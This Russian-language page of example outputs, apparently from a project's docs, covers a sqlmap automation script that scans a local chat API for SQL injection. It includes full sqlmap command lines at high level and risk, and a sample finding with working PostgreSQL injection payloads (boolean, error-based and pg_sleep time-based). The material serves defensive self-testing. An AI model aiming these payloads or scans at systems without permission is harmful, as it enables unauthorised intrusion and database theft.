# Примеры вывода и результатов

## Пример запуска основного скрипта

```
$ ./run_sqlmap_tests.sh

==================================================
SQLMap Automation Script для Chat Diffie-Hellman API
==================================================

Версия SQLMap:
sqlmap/1.7.11#stable

Конфигурация:
API URL: http://localhost:3000
JWT Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Проверка доступности API...
✓ API доступен

Запуск автоматизированного тестирования...

2025-11-11 14:30:22 - INFO - SQLMap Automation Script v1.0
2025-11-11 14:30:22 - INFO - Запуск: 2025-11-11 14:30:22.123456

2025-11-11 14:30:22 - INFO - ================================================================================
2025-11-11 14:30:22 - INFO - НАЧАЛО АВТОМАТИЗИРОВАННОГО ТЕСТИРОВАНИЯ SQL-ИНЪЕКЦИЙ
2025-11-11 14:30:22 - INFO - Базовый URL: http://localhost:3000
2025-11-11 14:30:22 - INFO - Всего эндпоинтов: 23
2025-11-11 14:30:22 - INFO - ================================================================================

2025-11-11 14:30:23 - INFO - ================================================================================
2025-11-11 14:30:23 - INFO - Тестирование: UserController_getAllUsers
2025-11-11 14:30:23 - INFO - Описание: Получить всех пользователей
2025-11-11 14:30:23 - INFO - URL: http://localhost:3000/users/all
2025-11-11 14:30:23 - INFO - Метод: GET
2025-11-11 14:30:23 - INFO - ================================================================================

2025-11-11 14:30:23 - INFO - Запуск SQLMap...
[14:30:24] [INFO] testing connection to the target URL
[14:30:24] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:30:25] [INFO] testing if the target URL content is stable
[14:30:25] [INFO] target URL content is stable
[14:30:25] [INFO] testing if GET parameter 'id' is dynamic
[14:30:26] [INFO] GET parameter 'id' appears to be dynamic
...

2025-11-11 14:32:15 - INFO - ✓ Уязвимости не найдены: UserController_getAllUsers

2025-11-11 14:32:16 - INFO - ================================================================================
2025-11-11 14:32:16 - INFO - Тестирование: AuthController_login
2025-11-11 14:32:16 - INFO - Описание: Вход пользователя
2025-11-11 14:32:16 - INFO - URL: http://localhost:3000/auth/login
2025-11-11 14:32:16 - INFO - Метод: POST
2025-11-11 14:32:16 - INFO - Данные: {
  "email": "test@example.com",
  "password": "testPassword123"
}
2025-11-11 14:32:16 - INFO - ================================================================================

...

2025-11-11 15:45:30 - INFO - 
================================================================================
2025-11-11 15:45:30 - INFO - ФИНАЛЬНЫЙ ОТЧЕТ
2025-11-11 15:45:30 - INFO - ================================================================================
2025-11-11 15:45:30 - INFO - Всего протестировано эндпоинтов: 23
2025-11-11 15:45:30 - INFO - Найдено уязвимых эндпоинтов: 0
2025-11-11 15:45:30 - INFO - Безопасных эндпоинтов: 23
2025-11-11 15:45:30 - INFO - ================================================================================

2025-11-11 15:45:30 - INFO - Отчет сохранен: ./sqlmap_results/final_report_20251111_154530.json

✓ Тестирование завершено успешно!
Результаты сохранены в директории: sqlmap_results/
Логи доступны в файле: sqlmap_automation.log

Всего проведено тестов: 23

Генерация сводного отчета...
Отчет сохранен: sqlmap_results/final_report_20251111_154530.json

Краткая сводка:
{
  "total_endpoints": 23,
  "vulnerable_endpoints": 0,
  "safe_endpoints": 23,
  "test_date": "2025-11-11T15:45:30",
  "base_url": "http://localhost:3000"
}

==================================================
Тестирование завершено!
==================================================
```

## Пример вывода при обнаружении уязвимости

```
2025-11-11 14:35:20 - INFO - ================================================================================
2025-11-11 14:35:20 - INFO - Тестирование: UserController_getUser
2025-11-11 14:35:20 - INFO - Описание: Получить пользователя по ID
2025-11-11 14:35:20 - INFO - URL: http://localhost:3000/users/740623ae-7cbe-46f5-aa5e-c7e1eb97a0ab
2025-11-11 14:35:20 - INFO - Метод: GET
2025-11-11 14:35:20 - INFO - ================================================================================

[14:35:21] [INFO] testing connection to the target URL
[14:35:21] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:35:22] [INFO] testing if the target URL content is stable
[14:35:22] [WARNING] GET parameter 'id' does not appear to be dynamic
[14:35:22] [WARNING] heuristic (basic) test shows that GET parameter 'id' might be injectable
[14:35:23] [INFO] testing for SQL injection on GET parameter 'id'
[14:35:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:35:24] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[14:35:25] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[14:35:25] [INFO] GET parameter 'id' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable
[14:35:26] [INFO] testing 'PostgreSQL inline queries'
[14:35:27] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[14:35:28] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[14:35:38] [INFO] GET parameter 'id' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable

sqlmap identified the following injection point(s) with a total of 52 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=740623ae-7cbe-46f5-aa5e-c7e1eb97a0ab' AND 1=1-- -

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: id=740623ae-7cbe-46f5-aa5e-c7e1eb97a0ab' AND 1=CAST((CHR(113)||CHR(122)||CHR(112)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(112)||CHR(122)||CHR(113)) AS NUMERIC)-- -

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: id=740623ae-7cbe-46f5-aa5e-c7e1eb97a0ab' AND (SELECT 1 FROM pg_sleep(5))-- -
---

2025-11-11 14:36:45 - WARNING - ⚠️  УЯЗВИМОСТЬ НАЙДЕНА: UserController_getUser

...

2025-11-11 15:45:30 - INFO - ================================================================================
2025-11-11 15:45:30 - INFO - ФИНАЛЬНЫЙ ОТЧЕТ
2025-11-11 15:45:30 - INFO - ================================================================================
2025-11-11 15:45:30 - INFO - Всего протестировано эндпоинтов: 23
2025-11-11 15:45:30 - INFO - Найдено уязвимых эндпоинтов: 1
2025-11-11 15:45:30 - INFO - Безопасных эндпоинтов: 22
2025-11-11 15:45:30 - INFO - ================================================================================

2025-11-11 15:45:30 - WARNING - 
⚠️  УЯЗВИМЫЕ ЭНДПОИНТЫ:
2025-11-11 15:45:30 - WARNING -   - GET http://localhost:3000/users/740623ae-7cbe-46f5-aa5e-c7e1eb97a0ab
2025-11-11 15:45:30 - WARNING -     Эндпоинт: UserController_getUser
2025-11-11 15:45:30 - WARNING -     Результаты: ./sqlmap_results/UserController_getUser_20251111_143520
```

## Пример JSON отчета

```json
{
  "summary": {
    "total_endpoints": 23,
    "vulnerable_endpoints": 1,
    "safe_endpoints": 22,
    "test_date": "2025-11-11T15:45:30.123456",
    "base_url": "http://localhost:3000"
  },
  "results": [
    {
      "endpoint": "UserController_getAllUsers",
      "url": "http://localhost:3000/users/all",
      "method": "GET",
      "timestamp": "20251111_143022",
      "vulnerable": false,
      "output_dir": "./sqlmap_results/UserController_getAllUsers_20251111_143022",
      "return_code": 0
    },
    {
      "endpoint": "UserController_getUser",
      "url": "http://localhost:3000/users/740623ae-7cbe-46f5-aa5e-c7e1eb97a0ab",
      "method": "GET",
      "timestamp": "20251111_143520",
      "vulnerable": true,
      "output_dir": "./sqlmap_results/UserController_getUser_20251111_143520",
      "return_code": 0
    },
    {
      "endpoint": "AuthController_login",
      "url": "http://localhost:3000/auth/login",
      "method": "POST",
      "timestamp": "20251111_143615",
      "vulnerable": false,
      "output_dir": "./sqlmap_results/AuthController_login_20251111_143615",
      "return_code": 0
    }
  ]
}
```

## Пример request_info.json

```json
{
  "endpoint": "AuthController_login",
  "description": "Вход пользователя",
  "url": "http://localhost:3000/auth/login",
  "method": "POST",
  "data": {
    "email": "test@example.com",
    "password": "testPassword123"
  },
  "timestamp": "20251111_143615",
  "command": "sqlmap -u http://localhost:3000/auth/login --method POST --headers Authorization: Bearer eyJhbGc... --batch --random-agent --level 5 --risk 3 --threads 5 --output-dir ./sqlmap_results/AuthController_login_20251111_143615 --flush-session --fresh-queries --technique BEUSTQ -v 1 --data {\"email\":\"test@example.com\",\"password\":\"testPassword123\"} --content-type application/json"
}
```

## Пример быстрого теста

```
$ python3 quick_test.py 4

================================================================================
Тестирование: POST /auth/login
URL: http://localhost:3000/auth/login
================================================================================

Body: {"email":"test@example.com","password":"testPassword123"}

Запуск SQLMap...

Команда: sqlmap -u http://localhost:3000/auth/login --method POST --headers Authorization: Bearer eyJhbGc... --batch --random-agent --level 3 --risk 2 -v 1 --data {"email":"test@example.com","password":"testPassword123"} --content-type application/json

        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.11#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal...

[*] starting @ 14:30:22 /2025-11-11/

[14:30:22] [INFO] testing connection to the target URL
[14:30:23] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:30:23] [INFO] testing if the target URL content is stable
...
```

## Структура директории с результатами

```
sqlmap_results/
├── UserController_getAllUsers_20251111_143022/
│   ├── request_info.json
│   ├── stdout.log
│   ├── stderr.log
│   └── target-localhost/
│       └── session.sqlite
├── UserController_getUser_20251111_143520/
│   ├── request_info.json
│   ├── stdout.log
│   ├── stderr.log
│   └── target-localhost/
│       ├── session.sqlite
│       └── dump/
│           └── users.csv
├── AuthController_login_20251111_143615/
│   ├── request_info.json
│   ├── stdout.log
│   └── stderr.log
├── final_report_20251111_154530.json
└── final_report_20251111_154530.html
```

## Пример HTML отчета (вид в браузере)

```
┌─────────────────────────────────────────────────────────┐
│     🔒 SQLMap Security Report                           │
│     Chat Diffie-Hellman API Security Testing            │
│     Дата тестирования: 2025-11-11T15:45:30             │
└─────────────────────────────────────────────────────────┘

┌──────────────┐  ┌──────────────┐  ┌──────────────┐
│ Всего        │  │ Уязвимые     │  │ Безопасные   │
│ эндпоинтов   │  │              │  │              │
│     23       │  │      1       │  │     22       │
│ Протестиров. │  │ Требуют внм. │  │ Защищены     │
└──────────────┘  └──────────────┘  └──────────────┘

📊 Статистика безопасности
Базовый URL: http://localhost:3000
Процент безопасности: 95.7%

⚠️ Обнаруженные уязвимости
Внимание! Найдены потенциальные SQL-инъекции.

┌─────────────────────────────────────────────────────────┐
│ UserController_getUser                     [УЯЗВИМ]     │
│ [GET] http://localhost:3000/users/...                   │
│ Тестирование: 20251111_143520                           │
│ Результаты: Открыть детальный отчет                     │
└─────────────────────────────────────────────────────────┘

📋 Все результаты тестирования

[Список всех 23 эндпоинтов с цветовыми индикаторами]
```
